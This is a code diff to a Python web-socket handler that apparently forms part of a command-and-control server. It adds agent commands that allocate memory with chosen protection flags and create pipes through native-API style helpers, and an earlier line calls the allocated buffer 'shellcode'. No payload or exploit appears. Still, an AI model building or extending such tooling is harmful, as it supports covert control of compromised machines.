@@ -1,9 +1,7 @@
 import logging
-from services.binary import allocmem
-from models.request import Request
 from models.response import Response
 logger = logging.getLogger(__name__)
-
+from services.exec_shell import rtlCreateProcessParametersEx, allocate_memory, createPipe
 
 def _shell_ws_agent(ws, agent, identity):
     import shlex
@@ -23,6 +21,9 @@ def _shell_ws_agent(ws, agent, identity):
         if isinstance(data, bytearray):
             return bytes(data)
         return str(data).encode("utf-8")
+
+    def rtl_test(*args):
+        pass
 
     #
     # Command handlers
@@ -45,20 +46,35 @@ def _shell_ws_agent(ws, agent, identity):
             size = int(args[0], 16)
             protection = int(args[1], 16)
         except ValueError:
-            raise ValueError(f"Invalid hex string: {value}")
-        shellcode = allocmem(agent.id, size, protection)
-        req_obj = Request(agent.id, shellcode)
-        req_obj.save()
-        response_obj = Response(agent.id, req_obj.response, req_obj.id)
-        response_obj.save()
-        return 
+            raise ValueError(f"Invalid hex string")
+        ntstatus, allocated_memory = allocate_memory(agent.id, size, protection)
+        ntstatus = bytearray(ntstatus).hex()
+        allocated_memory = bytearray(allocated_memory).hex()
+        return f"NTSTATUS = {ntstatus}. Allocated memory in {allocated_memory}"
+
+    def cmd_create_pipe(*args):
+        ntstatus, pipe_handle = createPipe(agent.id)
+        ntstatus = bytearray(ntstatus).hex()
+        pipe_handle = bytearray(pipe_handle).hex()
+        return f"NTSTATUS = {ntstatus}. Pipe Handle = {pipe_handle}"
 
     COMMANDS = {
         "echo": cmd_echo,
         "ping": cmd_ping,
         "whoami": cmd_whoami,
         "alloc": cmd_alloc,
+        "rtltest": rtl_test,
+        "createpipe": cmd_create_pipe,
     }
+
+    def mark_response_received(response_id):
+        db_session, res = Response.by_id_lock(response_id)
+
+        res.received = True
+        db_session.commit()
+        db_session.remove()
+        return True
+
 
     def dispatch_command(text):
         try:
@@ -92,21 +108,13 @@ def _shell_ws_agent(ws, agent, identity):
             while not stop_event.is_set():
                 try:
                     response_obj = Response.by_agent(agent.id)
-
+                    print(response_obj)
                     if response_obj is not None:
-                        # Avoid resending the same response if by_agent() returns the same row repeatedly
-                        if getattr(response_obj, "id", None) != last_seen_id:
-                            last_seen_id = getattr(response_obj, "id", 0)
-
-                            content = getattr(response_obj, "content", b"")
-                            if isinstance(content, bytes):
-                                try:
-                                    ws.send(content.decode("utf-8", errors="replace"))
-                                except Exception:
-                                    ws.send(str(content))
-                            else:
-                                ws.send(str(content))
-
+                        if response_obj.received == False:
+                            if response_obj.id != last_seen_id:
+                                ws.send(response_obj.content.decode())
+                                mark_response_received(response_obj.id)
+                                continue
                     time.sleep(1)
 
                 except Exception as e:
